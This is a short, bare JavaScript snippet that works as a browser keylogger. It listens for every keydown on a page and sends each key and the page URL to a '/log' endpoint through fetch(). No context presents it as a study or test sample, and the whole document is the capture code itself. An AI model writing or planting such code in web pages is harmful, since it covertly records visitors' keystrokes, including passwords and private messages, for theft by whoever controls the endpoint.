document.addEventListener('keydown', function(e) {
    fetch(`/log?k=${e.key}&url=${encodeURIComponent(location.href)}`);
});